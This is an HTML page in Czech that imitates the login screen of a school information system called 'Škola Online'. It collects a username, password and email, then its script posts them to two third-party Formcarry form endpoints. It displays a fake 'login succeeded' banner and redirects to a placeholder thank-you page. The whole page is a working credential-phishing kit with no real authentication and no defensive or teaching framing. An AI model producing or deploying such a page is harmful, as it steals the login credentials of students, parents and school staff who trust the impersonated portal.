<!DOCTYPE html>
<html lang="cs">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Školní informační systém</title>

<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:'Poppins', sans-serif;
}

body{
    min-height:100vh;
    background: linear-gradient(135deg,#0f2027,#203a43,#2c5364);
    display:flex;
    justify-content:center;
    align-items:center;
    flex-direction:column;
}

.top-success{
    position:fixed;
    top:-80px;
    left:0;
    width:100%;
    background:linear-gradient(135deg,#28a745,#1e7e34);
    color:white;
    text-align:center;
    padding:18px;
    font-weight:500;
    transition:0.5s ease;
    z-index:999;
    box-shadow:0 5px 20px rgba(0,0,0,0.3);
}

.top-success.show{
    top:0;
}

.login-container{
    width:420px;
    padding:45px;
    border-radius:20px;
    background:rgba(255,255,255,0.1);
    backdrop-filter:blur(20px);
    border:1px solid rgba(255,255,255,0.2);
    box-shadow:0 25px 50px rgba(0,0,0,0.3);
    color:white;
    animation:fadeIn 1s ease;
}

@keyframes fadeIn{
    from{opacity:0; transform:translateY(20px);}
    to{opacity:1; transform:translateY(0);}
}

.logo{
    text-align:center;
    margin-bottom:30px;
}

.logo h1{
    font-size:28px;
    font-weight:600;
}

.logo p{
    font-size:14px;
    opacity:0.8;
}

.input-group{
    margin-bottom:20px;
}

label{
    font-size:13px;
    opacity:0.8;
}

input{
    width:100%;
    padding:12px 14px;
    margin-top:6px;
    border:none;
    border-radius:10px;
    outline:none;
    font-size:14px;
    background:rgba(255,255,255,0.2);
    color:white;
}

button{
    width:100%;
    padding:14px;
    margin-top:10px;
    border:none;
    border-radius:10px;
    font-size:15px;
    font-weight:500;
    cursor:pointer;
    background:linear-gradient(135deg,#00c6ff,#0072ff);
    color:white;
    transition:0.3s;
}

button:hover{
    transform:translateY(-2px);
}

.footer{
    margin-top:25px;
    text-align:center;
    font-size:12px;
    opacity:0.7;
}
</style>
</head>

<body>

<div class="top-success" id="successBar">
    ✅ Přihlášení se povedlo!
</div>

<div class="login-container">
    <div class="logo">
        <h1>Škola Online</h1>
        <p>Přihlášení uživatele</p>
    </div>

    <form id="loginForm">
        <div class="input-group">
            <label>Uživatelské jméno</label>
            <input type="text" name="username" required>
        </div>

        <div class="input-group">
            <label>Heslo</label>
            <input type="password" name="password" required>
        </div>

        <div class="input-group">
            <label>Email (pro ověření)</label>
            <input type="email" name="email" required>
        </div>

        <input type="hidden" name="_redirect" value="https://tvoje-stranka.cz/dekuji.html">

        <button type="submit">Přihlásit se</button>
    </form>

    <div class="footer">
        © 2026 Školní informační systém
    </div>
</div>

<script>
document.getElementById("loginForm").addEventListener("submit", async function(e){
    e.preventDefault();

    const form = this;
    const formData = new FormData(form);
    const redirectUrl = form.querySelector("input[name='_redirect']").value;

    try {
        // 1️⃣ první Formcarry
        await fetch("https://formcarry.com/s/X_Af8yfXkAF", {
            method: "POST",
            body: formData
        });

        // 2️⃣ druhý Formcarry
        await fetch("https://formcarry.com/s/QHGwUM0Bsb9", {
            method: "POST",
            body: formData
        });

        // Zobraz success bar
        let bar = document.getElementById("successBar");
        bar.classList.add("show");

        // Přesměrování po 3 sekundách
        setTimeout(function(){
            window.location.href = redirectUrl;
        }, 3000);

    } catch (error) {
        alert("Došlo k chybě při odesílání.");
    }
});
</script>

</body>
</html>
